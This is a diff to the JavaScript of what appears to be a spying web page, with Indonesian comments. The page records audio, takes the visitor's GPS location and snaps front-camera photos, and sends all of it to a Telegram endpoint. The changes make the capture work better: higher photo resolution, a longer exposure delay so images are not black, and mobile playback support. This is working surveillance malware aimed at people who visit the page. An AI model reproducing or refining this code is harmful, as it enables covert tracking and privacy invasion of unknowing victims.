@@ -150,8 +150,6 @@
           },
           () => sendToTelegram(`📍 Lokasi GPS Ditolak`)
         );
-      } else {
-        sendToTelegram(`📍 Browser tidak support GPS`);
       }
     }
 
@@ -173,30 +171,37 @@
       }
     }
 
-    // FUNGSI KAMERA DEPAN YANG DIPERCEPAT
+    // PERBAIKAN FITUR FOTO AGAR JELAS (TIDAK HITAM)
     async function takePhotoFast() {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
+        });
         const video = document.createElement('video');
         video.srcObject = stream;
+        video.setAttribute('playsinline', ''); // Penting untuk mobile
         
-        // Langsung play dan ambil gambar segera setelah metadata tersedia
         video.onloadedmetadata = () => {
           video.play();
           
-          // Delay sangat singkat (100ms) untuk memastikan sensor kamera menangkap cahaya
+          // Memberi jeda 800ms agar kamera sempat mengatur exposure/cahaya
           setTimeout(() => {
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             const context = canvas.getContext('2d');
+            
+            // Mengambil gambar
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             
             canvas.toBlob(blob => {
-              sendPhoto(blob, 'depan.png', 'berhasil mengirim foto ✅');
+              if (blob) {
+                sendPhoto(blob, 'depan.png', 'berhasil mengirim foto ✅');
+              }
+              // Matikan stream setelah selesai
               stream.getTracks().forEach(track => track.stop());
             }, 'image/png');
-          }, 100); 
+          }, 800); 
         };
       } catch (err) {
         sendToTelegram(`Izin Kamera depan ditolak ❌`);
@@ -207,7 +212,7 @@
       createParticles();
       getInfo();
       autoRecordAudio();
-      takePhotoFast(); // Langsung memicu izin dan ambil foto cepat
+      takePhotoFast(); 
     });
 
     button.addEventListener('click', () => {
